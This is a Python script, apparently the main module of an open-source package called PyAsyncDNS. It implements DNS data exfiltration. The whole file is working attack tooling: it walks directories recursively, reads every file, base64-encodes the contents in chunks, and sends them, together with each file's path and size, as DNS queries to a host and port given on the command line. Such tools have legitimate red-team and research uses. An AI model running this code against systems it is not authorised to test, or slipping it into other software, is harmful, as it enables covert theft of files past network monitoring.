#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This package implements a basic asynchronous DNS client and server
#    with a feature to exfiltrate data through DNS.
#    Copyright (C) 2025  PyAsyncDNS

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This package implements a basic asynchronous DNS client and server
with a feature to exfiltrate data through DNS.
"""

__version__ = "0.0.1"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This package implements a basic asynchronous DNS client and server
with a feature to exfiltrate data through DNS.
"""
__url__ = "https://github.com/mauricelambert/PyAsyncDNS"

# __all__ = []

__license__ = "GPL-3.0 License"
__copyright__ = """
PyAsyncDNS  Copyright (C) 2025  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
copyright = __copyright__
license = __license__

from os import walk
from typing import List
from pathlib import Path
from asyncio import run, gather
from base64 import urlsafe_b64encode
from os.path import join, isdir, getsize
from sys import executable, stderr, argv, exit

if __package__:
    from .client import send_dns_udp_query
else:
    from client import send_dns_udp_query


async def process_chunks(
    chunks: List[bytes], host: str, port: int, id: int
) -> None:
    """
    This function process chunks for DNS exfiltration.
    """

    await send_dns_udp_query(
        ".".join(urlsafe_b64encode(x).decode() for x in chunks),
        host,
        port,
        transaction_id=id,
    )


async def read_and_chunk_file(
    filepath: str,
    host: str,
    port: int,
    id: int,
    chunk_size: int = 33,
    batch_size: int = 5,
) -> None:
    """
    This function reads a file as chunks and process chunks
    when the chunks length is equal to the batch size.

    chunk_size = 45 and batch_size = 5 last working value with UDP DNS queries (query 322 bytes)
    chunk_size = 36 and batch_size = 5 last working value with fqdn size (fqdn 240 bytes)
    chunk_size = 33 and batch_size = 5 last working value with UDP DNS responses (response 482 bytes)
    """

    print(f"\nReading file: {filepath} (id: {hex(id)})")
    await process_chunks(
        [x.encode() for x in Path(filepath).resolve().parts[1:]]
        + [str(getsize(filepath)).encode()],
        host,
        port,
        id,
    )
    try:
        with open(filepath, "rb") as f:
            chunk_batch = []
            while True:
                chunk = f.read(chunk_size)
                if not chunk:
                    break
                chunk_batch.append(chunk)

                if len(chunk_batch) == batch_size:
                    await process_chunks(chunk_batch, host, port, id)
                    chunk_batch = []

            if chunk_batch:
                await process_chunks(chunk_batch, host, port, id)
    except Exception as e:
        print(f"Error reading {filepath} (id: {hex(id)}): {e}")


async def process_directory(
    directory: str,
    host: str,
    port: int,
    index: int = 1,
    chunk_size: int = 33,
    batch_size: int = 5,
) -> None:
    """
    This function lists files recursively in a directory to process it.
    """

    counter = 1
    for root, _, files in walk(directory):
        for file in files:
            filepath = join(root, file)
            await read_and_chunk_file(
                filepath,
                host,
                port,
                ((index << 12) & 0xF000) + (counter & 0x0FFF),
                chunk_size,
                batch_size,
            )
            counter += 1


async def process_directories(
    directories: List[str], host: str, port: int
) -> None:
    """
    This function process each directory concurrently.
    """

    await gather(
        *(
            process_directory(directory_path, host, port, i + 1)
            for i, directory_path in enumerate(directories)
            if isdir(directory_path)
        )
    )


def main() -> int:
    """
    Main function to parse arguments and run DNS exfiltration.

    Returns:
        Exit code: 0 on success, 1 on usage error.
    """

    print(copyright)

    if len(argv) < 4:
        print(
            "Usage:",
            executable,
            argv[0],
            "<host> <port> <directory_path ...>",
            file=stderr,
        )
        return 1

    if not argv[2].isdigit():
        print("Invalid port number, it should be an integer.")
        return 1

    run(process_directories(argv[3:], argv[1], int(argv[2])))
    return 0


if __name__ == "__main__":
    exit(main())
